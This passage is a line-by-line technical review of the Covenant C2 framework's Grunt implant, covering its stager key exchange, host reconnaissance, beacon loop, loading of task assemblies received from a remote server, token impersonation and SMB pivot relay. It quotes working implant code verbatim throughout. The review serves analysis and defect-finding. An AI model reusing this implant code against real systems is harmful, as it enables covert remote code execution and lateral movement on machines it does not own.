**Related: the `Delay` variable is captured, not volatile.** `Thread.Sleep((Delay + change) * 1000)` and `TaskExecute(messenger, message, Delay)` (`:188`, `:208`) read the *loop-local* `Delay`, and the `SetDelay` handler at `:110` writes it. There is no `volatile` and no lock; the task-execution threads created at `:188`/`:208` capture the value by closure at thread-creation time, so a `SetDelay` issued while a task is running does **not** propagate into the already-started `TaskExecute` — the `Delay` used for streaming cadence (`:287`, `:307`) is frozen at the value in effect when the thread started. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:110, :188, :208, :287, :307]`

**Related: `rnd.Next(2)` sign flip is biased.** `rnd.Next(2)` returns 0 or 1 uniformly, and the condition is `== 0`, so negative and positive are equally likely — no bias — but combined with the zero bound the sign is irrelevant. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:95]`

---

## 4. The stager — full stage 0/1/2 walkthrough

`Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs` (253 lines) is the entire pre-executor lifetime. Every method in the file:

### 4.1 `GruntStager` class members

| Member | Lines | Signature | Purpose |
|---|---|---|---|
| `GruntStager()` | 15-18 | ctor | Immediately calls `ExecuteStager()` |
| `Main(string[])` | 19-23 | `public static void Main`, `[STAThread]` | CLR entry; `new GruntStager()` |
| `Execute()` | 24-27 | `public static void` | The **reflection entry point** invoked by the executor loader; `new GruntStager()` |
| `ExecuteStager()` | 28-209 | `public void` | The whole handshake |
| `CookieWebClient` inner class | 211-229 | — | `WebClient` subclass carrying a `CookieContainer` |
| `Parse(data, format)` | 231-249 | `public static List<string>` | Same regex-substitution parser as the implant |

`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:15-249]`

### 4.2 Stage 0 — upload the RSA public key

```csharp
// Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:43-59
string aGUID = @"{{REPLACE_GRUNT_GUID}}";
string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
byte[] SetupKeyBytes = Convert.FromBase64String(@"{{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}}");
string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";

Aes SetupAESKey = Aes.Create();
SetupAESKey.Mode = CipherMode.CBC;
SetupAESKey.Padding = PaddingMode.PKCS7;
SetupAESKey.Key = SetupKeyBytes;
SetupAESKey.GenerateIV();
HMACSHA256 hmac = new HMACSHA256(SetupKeyBytes);
RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048, new CspParameters());

byte[] RSAPublicKeyBytes = Encoding.UTF8.GetBytes(rsa.ToXmlString(false));
byte[] EncryptedRSAPublicKey = SetupAESKey.CreateEncryptor().TransformFinalBlock(RSAPublicKeyBytes, 0, RSAPublicKeyBytes.Length);
byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);
string Stage0Body = String.Format(MessageFormat, aGUID + GUID, "0", "", Convert.ToBase64String(SetupAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:43-59]`

Points of substance:

1. **`aGUID + GUID`** — the 20-character composite GUID. `aGUID` is the operator-supplied stage-0 GUID (10 chars), `GUID` is a fresh `Guid.NewGuid()` compressed to its first 10 hex chars. This is exactly the `OriginalServerGuid(10) + Guid(10)` split that `InternalListener.Write` unpacks at `InternalListener.cs:444-446`. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:44, :59]`
2. **`Type` is the bare integer-as-string `"0"`** in the format slot at `:46` (`"Type":{1}`, unquoted) — so the emitted JSON is `"Type":0`. This is the *same* literal format string as the executor's `GruntEncryptedMessageFormat` (`GruntHTTP.cs:1094`), which explains why the int-parse works: both the stager and the executor emit unquoted integers. **The interop hazard is purely against a peer that emits the server's string enum.**
3. **`rsa.ToXmlString(false)`** — `RSACryptoServiceProvider` is used here (not `RSA.Create()`), keyed 2048-bit with a default `CspParameters`. `false` = public key only; the XML is the classic `RSAKeyValue` form, matching the server's hand-rolled `RSAKeyExtensions.FromXmlString`. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:54, :56]`
4. The `SetupAESKey` is used **only as an encryptor** here — `SetupAESKey.IV` is transmitted in the clear so the server can decrypt. The shared secret is the AES key and the HMAC key — one key, two uses.

**URI selection loop, `:82-105`:** the stager iterates every candidate `CovenantURI`, applies the profile headers with `{GUID}` replaced by the **empty string** (`:91`, `:95`), and GETs a random profile URL to test reachability. On success it records `CovenantURI = uri` and falls through; on failure `catch { continue; }`. Note the loop has no `break` — it keeps trying every URI and the **last** successful one wins, not the first. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:83-105]`

**TLS policy, `:61-74`:** `ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;` — SSL 3.0 is explicitly enabled. The validation callback returns `valid` where `UseCertPinning` compares `cert.GetCertHashString() == CovenantCertHash` and `ValidateCert` additionally requires `SslPolicyErrors.None`. With both flags false (the `Launcher` defaults are `ValidateCert=false, UseCertPinning=false`), the callback returns `true` unconditionally — **the stager accepts any certificate**. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:61-74]`

### 4.3 Stage 0 response — RSA-OAEP-SHA1 decrypt of the session key

```csharp
// Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:117-133
Stage0Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
string extracted = Parse(Stage0Response, ProfileHttpPostResponse)[0];
extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
List<string> parsed = Parse(extracted, MessageFormat);
string iv64str = parsed[3];
string message64str = parsed[4];
string hash64str = parsed[5];
byte[] messageBytes = Convert.FromBase64String(message64str);
if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
SetupAESKey.IV = Convert.FromBase64String(iv64str);
byte[] PartiallyDecrypted = SetupAESKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
byte[] FullyDecrypted = rsa.Decrypt(PartiallyDecrypted, true);

Aes SessionKey = Aes.Create();
SessionKey.Mode = CipherMode.CBC;
SessionKey.Padding = PaddingMode.PKCS7;
SessionKey.Key = FullyDecrypted;
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:117-133]`

- `rsa.Decrypt(PartiallyDecrypted, true)` — the `bool` overload means **OAEP padding** (the SHA-1 variant, which is the only OAEP hash .NET Framework's `RSACryptoServiceProvider` supports). This is the grunt half of the `RSAEncryptionPadding.OaepSHA1` at `InternalListener.cs:884`. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:128]`
- HMAC is verified over the ciphertext **before** decryption (`:125`) — correct order (encrypt-then-MAC), and the compare is the short-circuiting string compare, not constant time.
- `SessionKey.Key = FullyDecrypted` — the decrypted bytes *become* the AES key. Length is whatever the server put in, and `Aes.Key` will throw if it is not exactly 16/24/32 bytes.
- Failure is `return` — silently, with no console output. A failed HMAC at stage 0 ends the stager with no trace. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:125, :165, :173, :202]`

### 4.4 Stage 1 — challenge exchange

```csharp
// Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:134-142
hmac = new HMACSHA256(SessionKey.Key);
byte[] challenge1 = new byte[4];
RandomNumberGenerator rng = RandomNumberGenerator.Create();
rng.GetBytes(challenge1);
byte[] EncryptedChallenge1 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge1, 0, challenge1.Length);
hash = hmac.ComputeHash(EncryptedChallenge1);

string Stage1Body = String.Format(MessageFormat, GUID, "1", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge1), Convert.ToBase64String(hash));
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:135-142]`

`challenge1` is 4 CSPRNG bytes. The HMAC key is now the **session key**, not the shared secret — the switch happens at `:135`. The GUID sent from stage 1 onward is the bare 10-char `GUID` (not the composite) — `:142` passes `GUID` where `:59` passed `aGUID + GUID`. That is the moment the grunt "becomes" addressable at its own GUID, matching the server's `switch (targetGrunt.Status)` at `InternalListener.cs:481`. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:142]`

Response handling (`:158-173`) verifies HMAC, decrypts, and splits:

```csharp
byte[] DecryptedChallenges = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
byte[] challenge1Test = new byte[4];
byte[] challenge2 = new byte[4];
Buffer.BlockCopy(DecryptedChallenges, 0, challenge1Test, 0, 4);
Buffer.BlockCopy(DecryptedChallenges, 4, challenge2, 0, 4);
if (Convert.ToBase64String(challenge1) != Convert.ToBase64String(challenge1Test)) { return; }
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:168-173]`

The server sent `challenge1.Concat(challenge2)` (`InternalListener.cs:711`); the grunt echoes `challenge1` back implicitly by verifying it, then re-encrypts `challenge2` for stage 2. **A `Buffer.BlockCopy` of only 4 bytes into each 4-byte array means a server response shorter than 8 bytes throws `ArgumentException`** — caught by the outer `catch (Exception e)` at `:208`.

### 4.5 Stage 2 — receive and invoke the executor

```csharp
// Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:204-206
byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:204-206]`

`GetTypes()[0].GetMethods()[0]` — **the first type's first method**, by reflection order, with no name check. For the compiled `GruntHTTP.cs` the namespace is `GruntExecutor`, the type is `Grunt` (`GruntHTTP.cs:18`), and the first declared method is `public static void Execute(string CovenantURI, string CovenantCertHash, string GUID, Aes SessionKey)` (`GruntHTTP.cs:20`) — matching the four arguments exactly. This is the stager→executor ABI and it is **positional and ordinal**, not name-based: any reordering of methods in `GruntHTTP.cs` silently breaks activation. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:206]`

The outer `catch (Exception e) { Console.Error.WriteLine(e.Message + ... + e.StackTrace); }` at `:208` is the only error surface in the entire stager.

---

## 5. Implant internals — `GruntHTTP.cs` member-by-member

### 5.1 Top-level types in the file

| Type | Lines | Role |
|---|---|---|
| `GruntExecutor.Grunt` | 18-371 | The implant: `Execute` beacon loop + `TaskExecute` |
| `MessageType` (enum) | 373-377 | `Read`, `Write` |
| `ProfileMessage` | 379-383 | `{Type, Message}` |
| `MessageEventArgs` | 385-388 | `{Message}` |
| `IMessenger` (interface) | 390-399 | Transport contract |
| `Profile` | 401-439 | Get/Post request/response template parse+format |
| `TaskingMessenger` | 441-598 | Queue, dispatch, relay, downstream management |
| `SMBMessenger` | 600-820 | Named-pipe transport |
| `HttpMessenger` | 822-921 | HTTP transport |
| `MessageCrafter` | 923-966 | Encrypt/decrypt + envelope construction |
| `CookieWebClient` | 968-986 | `WebClient` with cookie jar |
| `GruntTaskingType` (enum) | 988-1000 | 10 tasking kinds |
| `GruntTaskingMessage` | 1002-1033 | Inner tasking payload |
| `GruntTaskingStatus` (enum) | 1035-1042 | 5 states |
| `GruntTaskingMessageResponse` | 1044-1063 | Task output packet |
| `GruntEncryptedMessage` | 1065-1122 | The envelope |
| `Common` | 1124-1130 | 4 crypto constants |
| `Utilities` | 1132-1308 | AES/HMAC/Deflate/Parse/JS-encode |

### 5.2 `Grunt.Execute` — per-function

```csharp
public static void Execute(string CovenantURI, string CovenantCertHash, string GUID, Aes SessionKey)
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:20]`

**Compile-time substitution block (`:24-35`)** — nine `{{REPLACE_*}}` tokens, all read as string literals then converted:

| Token | Line | Conversion |
|---|---|---|
| `{{REPLACE_DELAY}}` | 24 | `Convert.ToInt32` |
| `{{REPLACE_JITTER_PERCENT}}` | 25 | `Convert.ToInt32` |
| `{{REPLACE_CONNECT_ATTEMPTS}}` | 26 | `Convert.ToInt32` |
| `{{REPLACE_KILL_DATE}}` | 27 | `DateTime.FromBinary(long.Parse(...))` |
| `{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}` | 28 | comma-split, base64→UTF8 |
| `{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}` | 29 | comma-split, base64→UTF8 |
| `{{REPLACE_PROFILE_HTTP_URLS}}` | 30 | comma-split, base64→UTF8 |
| `{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}` | 31 | `.Replace(Environment.NewLine, "\n")` |
| `{{REPLACE_PROFILE_HTTP_POST_REQUEST}}` | 32 | `.Replace(Environment.NewLine, "\n")` |
| `{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}` | 33 | `.Replace(Environment.NewLine, "\n")` |
| `{{REPLACE_VALIDATE_CERT}}` | 34 | `bool.Parse` |
| `{{REPLACE_USE_CERT_PINNING}}` | 35 | `bool.Parse` |

`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:24-35]`

Header names/values/URLs are **base64-wrapped** so that quotes, commas, semicolons and newlines in an operator-authored HTTP profile survive the `verbatim string literal` injection. The three response/request templates are **not** base64 — they are injected raw into verbatim literals with only newline normalization, which means a profile containing `"` would break compilation. `[inference, from GruntHTTP.cs:31-33]` The base64 round-trip is done twice: once at compile time by `Compiler.cs` substitution, once at runtime by `.Select(H => Encoding.UTF8.GetString(Convert.FromBase64String(H)))`.

**Host recon (`:37-63`)** — pure .NET, no P/Invoke:

```csharp
string Hostname = Dns.GetHostName();
string IPAddress = Dns.GetHostAddresses(Hostname)[0].ToString();
foreach (IPAddress a in Dns.GetHostAddresses(Dns.GetHostName()))
{
    if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
    {
        IPAddress = a.ToString();
        break;
    }
}
string OperatingSystem = Environment.OSVersion.ToString();
string Process = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
int Integrity = 2;
if (Environment.UserName.ToLower() == "system")
{
    Integrity = 4;
}
else
{
    var identity = WindowsIdentity.GetCurrent();
    if (identity.Owner != identity.User)
    {
        Integrity = 3;
    }
}
string UserDomainName = Environment.UserDomainName;
string UserName = Environment.UserName;
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:37-63]`

`Integrity` is a 3-value CLR-only heuristic: `4` = SYSTEM by username string match (`"system"`, lowercased), `3` = token owner ≠ token user (an elevated-but-not-SYSTEM heuristic — the canonical "high integrity" test using the `WindowsIdentity` owner/user SID comparison rather than the integrity SID), `2` = default. There is **no** `GetTokenInformation(TokenIntegrityLevel)` call anywhere — the integrity level is inferred, so a token at `MediumPlus` or a protected process is indistinguishable from Medium. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:49-61]`

`IPAddress` is initialized to `GetHostAddresses(Hostname)[0]` and then overwritten by the first IPv4 if one exists; the initial `[0]` can be IPv6, so a dual-stack host without a v4 address reports `::1`-style text. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:38-46]`

**The register body is hand-built JSON by string concatenation (`:65`)** — no serializer, no escaping:

```csharp
string RegisterBody = @"{ ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""hostname"": """ + Hostname + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:65]`

Every string value is concatenated bare. A hostname or username containing `"` or `\` produces invalid JSON. Windows computer names cannot contain `"`, and `Environment.UserName` is constrained, so this is safe in practice — but `UserDomainName`/`OperatingSystem` are attacker-influenceable only via unusual AD/registry config. The `status: 0` is a hardcoded `Uninitialized`. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:65]`

**Messenger bootstrap (`:66-78`):**

```csharp
IMessenger baseMessenger = null;
baseMessenger = new HttpMessenger(CovenantURI, CovenantCertHash, UseCertPinning, ValidateCert, ProfileHttpHeaderNames, ProfileHttpHeaderValues, ProfileHttpUrls);
baseMessenger.Read();
baseMessenger.Identifier = GUID;
TaskingMessenger messenger = new TaskingMessenger
(
    new MessageCrafter(GUID, SessionKey),
    baseMessenger,
    new Profile(ProfileHttpGetResponse, ProfileHttpPostRequest, ProfileHttpPostResponse)
);
messenger.QueueTaskingMessage(RegisterBody);
messenger.WriteTaskingMessage();
messenger.SetAuthenticator(messenger.ReadTaskingMessage().Message);
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:66-78]`

- `baseMessenger.Read()` at `:68` is a **pre-identifier GET** — it runs before `Identifier = GUID` at `:69`, so the `{GUID}` placeholder in the URL expands to an *empty* Identifier. This is the "cookie/antivirus priming" GET: it establishes the session cookie (ASP.NET session ID) so that the following POST appears to belong to an existing session.
- `SetAuthenticator(messenger.ReadTaskingMessage().Message)` at `:78` — the server's register response carries a token that becomes the HTTP `Authenticator`. **If `ReadTaskingMessage()` returns `null`** (parse failure, or a server reply that is the register `Tasks` tasking rather than a bare string), this throws `NullReferenceException` on `.Message`, caught by the outer `catch` at `:230` — the implant dies before the loop. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:78]` The register handshake therefore depends on the server having answered `RegisterGrunt`'s issued `Tasks` tasking (`InternalListener.cs:795-801`) with a parseable envelope.
- The blank write at `:82-83` (in a `try/catch` that swallows everything) is the proxy-priming write, exactly as T2 noted.

**The loop, `:92-228`:** covered in §3 for the jitter. The dispatch cascade is:

```
:104  SetDelay | SetJitter | SetConnectAttempts   -> int.TryParse, mutate locals, respond Completed
:130  SetKillDate                                 -> DateTime.TryParse, mutate KillDate
:143  Exit                                        -> respond "Exited", flush, return  (connection NOT closed)
:150  Tasks                                       -> enumerate live entries of List<KeyValuePair<string,Thread>>
:161  TaskKill                                    -> Thread.Abort(), then Suspend() if still alive
:181  message.Token == true                       -> symbolic-execution thread; Join(5000); Impersonate() if token returned
:206  default                                     -> fire-and-forget thread
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:104-211]`

* `Exit` at `:143-149` returns from `Execute` without calling `messenger.Close()` — the TCP connection is left to GC. It does flush the response first.
* `TaskKill` at `:161-180` is the most dated construct in the file: `Thread.Abort()` (`:171`) is unsupported on .NET Core (throws `PlatformNotSupportedException`) and `Thread.Suspend()` (`:175`) is likewise unsupported and `[Obsolete]` even on Framework. On .NET Framework 3.5/4.0 the sequence Abort→`Thread.Sleep(3000)`→`Suspend` is a two-stage kill, and `Suspend` after a failed `Abort` can leave a thread permanently suspended holding locks. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:171-176]`
* `Tasks` (`:150-158`) only reports threads where `IsAlive`; the list is never pruned of dead entries (`Tasks.Add` at `:190`/`:210` with no removal), so the list grows unboundedly across the implant's lifetime. The "Task" name is `message.Name` — the server-generated 10-char name from `InternalListener.cs:798`.
* The token branch (`:181-205`) is the impersonation path. It starts a thread, `Join(5000)` — **a hardcoded 5-second ceiling**, not `Delay` — and only if the thread completed within 5 s *and* returned a non-zero token does it `Impersonate()`. Otherwise `impersonationContext = null`. A long-running token task therefore silently fails to impersonate. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:191-204]`
* `ConnectAttemptCount` is incremented on **both** `ObjectDisposedException` (`:215`) and any other exception (`:221`); it is reset to 0 only on a successful `ReadTaskingMessage` returning non-null (`:102`). `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:102, :217, :223]`
* The loop's terminal conditions at `:226-227` — `ConnectAttemptCount >= ConnectAttempts` or `KillDate.CompareTo(DateTime.Now) < 0` — both `return` from `Execute` with no notification to the operator.

### 5.3 `TaskExecute` — the task loader

```csharp
private static IntPtr TaskExecute(TaskingMessenger messenger, GruntTaskingMessage message, int Delay)
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:236]`

Returns `WindowsIdentity.GetCurrent().Token` (`:369`) — **always**, on every path, including the exception path (the `finally` at `:350` does not change the return). So a token task whose body threw still returns the *current* (pre-task) token, and the caller at `:192` will `Impersonate()` onto the **grunt's own token** — a silent no-op impersonation that reports success. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:369, :341-349]`

**The task assembly ABI (`:242-258`):**

```csharp
if (message.Type == GruntTaskingType.Assembly)
{
    string[] pieces = message.Message.Split(',');
    if (pieces.Length > 0)
    {
        object[] parameters = null;
        if (pieces.Length > 1) { parameters = new object[pieces.Length - 1]; }
        for (int i = 1; i < pieces.Length; i++) { parameters[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
        byte[] compressedBytes = Convert.FromBase64String(pieces[0]);
        byte[] decompressedBytes = Utilities.Decompress(compressedBytes);
        Assembly gruntTask = Assembly.Load(decompressedBytes);
        PropertyInfo streamProp = gruntTask.GetType("Task").GetProperty("OutputStream");
        string results = "";
        if (streamProp == null)
        {
            results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
        }
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:244-258]`

- The wire format is `base64(deflated-assembly)[,base64(param)]*` — matching the server's `GetGruntTaskingMessage` at `InternalListener.cs:207-227`.
- **`GruntTask.GetType("Task").GetProperty("OutputStream")`** — this answers T2 residual unknown #9: the reflection contract property is named exactly **`OutputStream`**, is looked up with **default binding flags**, and `streamProp.SetValue(null, pipeClient, null)` at `:266` passes `null` as the instance — so it must be a **`public static`** property. The property type must be assignable from `AnonymousPipeClientStream` (a `Stream`). A task declaring `public static Stream OutputStream { get; set; }` receives the pipe and its writes stream to the operator live. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:253, :266]`
- `GetProperty` with no `BindingFlags` searches **public instance and static** members, so an instance property `OutputStream` would also be found and then `SetValue(null, ...)` would throw `TargetException` — reaching the outer `catch` at `:341`. `[inference]`
- `Assembly.Load(decompressedBytes)` — bytes from the wire are loaded directly into the AppDomain. There is **no** verification that the assembly is the one the server compiled (beyond the HMAC over the envelope, which the server itself produced). `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:252]`

**Streaming path (`:261-324`)** — this is the code T2 quoted. Full flow:

```csharp
Thread invokeThread = new Thread(() => results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters));
using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
{
    streamProp.SetValue(null, pipeClient, null);
    DateTime lastTime = DateTime.Now;
    invokeThread.Start();
    using (StreamReader reader = new StreamReader(pipeServer))
    {
        object synclock = new object();
        string currentRead = "";
        Thread readThread = new Thread(() => {
            int count;
            char[] read = new char[MAX_MESSAGE_SIZE];
            while ((count = reader.Read(read, 0, read.Length)) > 0)
            {
                lock (synclock) { currentRead += new string(read, 0, count); }
            }
        });
        readThread.Start();
        while (readThread.IsAlive)
        {
            Thread.Sleep(Delay * 1000);
            lock (synclock)
            {
                ...
            }
        }
        output += currentRead;
    }
}
invokeThread.Join();
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:261-323]`

Substantive defects visible in this block:

1. **`Thread.Sleep(Delay * 1000)` inside the drain loop (`:287`).** The polling cadence for streaming output is the beacon `Delay` (5 s default). A task that finishes in 200 ms still takes up to 5 s to flush, because the reader thread must die first and the loop only re-checks `readThread.IsAlive` after each sleep. Streaming output is therefore delivered in `Delay`-sized batches. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:285-287]`
2. **`MAX_MESSAGE_SIZE = 1048576` (`:238`) is a *char* count**, and the read buffer at `:275` is `new char[MAX_MESSAGE_SIZE]` = **1,048,576 chars = 2 MiB** of UTF-16. The threshold comparisons at `:292` and `:307` compare `currentRead.Length` (chars) against the same constant. The wire packet is then `base64` of a JSON string of those chars, so the actual upload can be ~2.8 MB per chunk before base64 expansion of the JSON envelope. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:238, :275, :292, :294]`
3. **The `>=` branch at `:292-306` never resets between main-loop iterations if the reader keeps growing** — it re-slices the whole `currentRead` from index 0 each time and sets `currentRead = ""` at `:304`, but because it does so under the lock while the reader thread appends, any append that lands between the append and the reset is preserved. This is correct, though the cumulative string concatenation (`currentRead += ...` at `:280`) is O(n²) for large outputs. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:280, :292-306]`
4. **The `catch (ThreadAbortException) { break; }` at `:315`** breaks the inner `while` but the `catch` clause is *inside* the `lock (synclock)` block — breaking out of the loop while holding the monitor releases it correctly via the lock's implicit try/finally. On .NET Core `ThreadAbortException` never occurs, so this is dead code there.
5. **The `finally` block at `:350-368` re-emits the whole `output`**, which already had partial chunks emitted as `Progressed` at `:299-310`. `output` accumulates the streamed text at `:319` (`output += currentRead`) *plus* `results` at `:325`, and the `finally` then slices the **whole** thing again. **Streamed output is duplicated on the wire**: once as `Progressed` chunks during the run, once again in the `finally` re-transmission. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:319, :325, :352-362]`

**The `finally` also always emits a final response (`:363-367`)** even when `output` is empty — a bare `Completed` with empty output, so the server always gets a terminal status for the task.

### 5.4 `TaskingMessenger` — the dispatch core

```csharp
public GruntTaskingMessage ReadTaskingMessage()
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:464-504]`

Control flow: lock `_UpstreamLock` → `UpstreamMessenger.Read()` → if `null` return `null` → select the parse template by `Read`/`Write` — then:

```csharp
if (gruntMessage == null) { return null; }
else if (gruntMessage.Type == GruntEncryptedMessage.GruntEncryptedMessageType.Tasking)
{
    string json = this.Crafter.Retrieve(gruntMessage);
    return (json == null || json == "") ? null : GruntTaskingMessage.FromJson(json);
}
else
{
    string json = this.Crafter.Retrieve(gruntMessage);
    GruntEncryptedMessage wrappedMessage = GruntEncryptedMessage.FromJson(json);
    IMessenger relay = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier == wrappedMessage.GUID);
    if (relay != null)
    {
        relay.Write(this.Profile.FormatGetResponse(wrappedMessage));
    }
    return null;
}
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:488-503]`

This is **the pivot/relay logic**. A `Routing`-typed envelope arriving at a parent grunt is decrypted with the *parent's* session key, re-parsed as another envelope, matched against `DownstreamMessengers` by `.Identifier`, and written out through the matching child's transport. That is how a task travels egress→parent→child. The `Retrieve` at `:495` returning `null` on HMAC failure is **not checked** before `GruntEncryptedMessage.FromJson(json)` at `:496` — `FromJson` on a null string reaches `Utilities.Parse(null, format)` → `new Regex(format).Match(null)` which throws `ArgumentNullException`, caught by the loop's `catch (Exception)` at `:221`. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:495-496]`

```csharp
public void QueueTaskingMessage(string Message, string Meta = "")
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:506-514]` — `Crafter.Create(Message, Meta)` → `Profile.FormatPostRequest(...)` → enqueue under `_MessageQueueLock`. The `Meta` is the task name that the server matches on at `InternalListener.cs:522`.

```csharp
public void WriteTaskingMessage()
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:516-529]` — nested locks `_UpstreamLock` then `_MessageQueueLock`, then `Dequeue()` and write. The `catch (InvalidOperationException) {}` at `:528` swallows the empty-queue case, so a write with nothing queued is a silent no-op. **Lock ordering is consistent** (`_UpstreamLock` → `_MessageQueueLock`) at both `:520-523`; `ReadTaskingMessage` takes only `_UpstreamLock`, so no inversion.

```csharp
public bool Connect(string Hostname, string PipeName)
public bool Disconnect(string Identifier)
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:539-597]`

`Connect` closes and removes any existing downstream whose `Hostname` matches `Hostname + ":" + PipeName` (case-insensitive, `:541`), constructs an `SMBMessenger` (`:548`), spawns a read thread (`:549-580`) that loops while `downstream.IsConnected`, forwards every non-empty message upstream (`:570`), and — critically — **derives the downstream's `Identifier` lazily from the first message** (`:558-569`):

```csharp
if (string.IsNullOrEmpty(downstream.Identifier))
{
    GruntEncryptedMessage message = this.Profile.ParsePostRequest(read.Message);
    if (message.GUID.Length == 20) { downstream.Identifier = message.GUID.Substring(10); }
    else if (message.GUID.Length == 10) { downstream.Identifier = message.GUID; }
}
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:558-569]`

That is the **child-side** counterpart of the server's 20-char split at `InternalListener.cs:444-446`: the 20-char composite is truncated to its last 10 to key the relay. If `ParsePostRequest` returns `null` the deref at `:561` throws into the thread's `catch` at `:573` — the exception is logged but the thread **continues its `while`**, so a persistently malformed downstream does not terminate the reader. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:573-576]`

